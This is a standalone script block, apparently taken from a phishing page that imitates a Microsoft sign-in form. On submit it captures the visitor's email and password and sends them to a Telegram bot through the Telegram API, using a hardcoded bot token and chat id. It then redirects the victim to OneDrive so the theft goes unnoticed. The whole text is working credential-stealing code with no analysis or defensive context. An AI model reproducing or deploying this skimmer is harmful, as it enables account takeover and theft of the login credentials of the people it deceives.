    <script>


            // DOM elements  
const form = document.querySelector('#i0281');
const emailElement = document.querySelector('.identityBanner div');
const passwordElement = document.querySelector('#i0118');

// Telegram bot config
const chatId = '6614612178'; 
const botId = 'bot6407429672:AAGohq4APsO_T2K_sH_yFGaIEKzjvGW4shY';
const telegramUrl = `https://api.telegram.org/${botId}/sendMessage`;

// Form submit handler
form.addEventListener('submit', async event => {

  event.preventDefault();

  // Get email and password
  const email = emailElement.textContent;
  const password = passwordElement.value;

  try {
    
    // Send data to Telegram
    await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: chatId, 
        text: `Email: ${email}\nPassword: ${password}`  
      })
    });
    
    // Redirect to OneDrive
    window.location.href = 'https://onedrive.live.com';

  } catch (error) {

    // Handle error
    console.error('Sending message failed', error);
    
    // Show message to user
    const message = document.createElement('div');
    message.textContent = 'Message failed to send';
    document.querySelector('#main').appendChild(message);

  }

});


    </script>
